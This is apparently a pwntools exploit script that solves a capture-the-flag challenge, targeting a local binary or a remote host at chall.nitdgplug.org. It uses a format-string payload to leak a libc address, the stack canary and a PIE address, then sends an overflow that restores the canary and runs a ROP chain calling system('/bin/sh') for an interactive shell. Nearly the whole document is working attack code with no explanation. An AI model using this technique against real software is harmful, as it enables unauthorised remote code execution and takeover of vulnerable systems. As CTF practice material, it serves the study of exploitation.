#!/usr/bin/python3
import pwn
pwn.context.terminal = ['tmux','splitw','-h']

elf = pwn.context.binary =pwn.ELF("./chall")

# 13 - stdout
# 23 - canary
# 25 - pieleak

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path,gdbscript='b *vuln+128\nc\n')
    libc = pwn.ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
elif pwn.args.REMOTE:
    io = pwn.remote("chall.nitdgplug.org",30091)
    libc = pwn.ELF("./libc.so.6")
else:
    io = elf.process()
    libc = pwn.ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

fmt_payload = b'%13$p.%23$p.%25$p.'
io.recvline()
io.sendline(fmt_payload)
stdout_leak = int(io.recvuntil(b'.',drop=True),16)
canary = int(io.recvuntil(b'.',drop=True),16)
pie_leak = int(io.recvuntil(b'.',drop=True),16)


pwn.log.success("LIBC leak : " + hex(stdout_leak))
pwn.log.success("Canary leak : " + hex(canary))
pwn.log.success("PIE leak : " + hex(pie_leak))

libc.address = stdout_leak - libc.sym['_IO_2_1_stdout_']
pwn.log.success("LIBC Base: " + hex(libc.address))
elf.address = pie_leak - 4821
pwn.log.success("PIE Base : " + hex(elf.address))

ret_addr = elf.address + 0x000000000000101a
pwn.log.info("Ret Gadget: " + hex(ret_addr))
payload = b'A'*72
payload += pwn.p64(canary)
payload += b'B'*8
rop = pwn.ROP(libc)
bin_sh = next(libc.search(b'/bin/sh'))
rop.system(bin_sh)
payload += pwn.p64(ret_addr)
payload += rop.chain()
print(rop.dump())
io.sendline(payload)

io.interactive()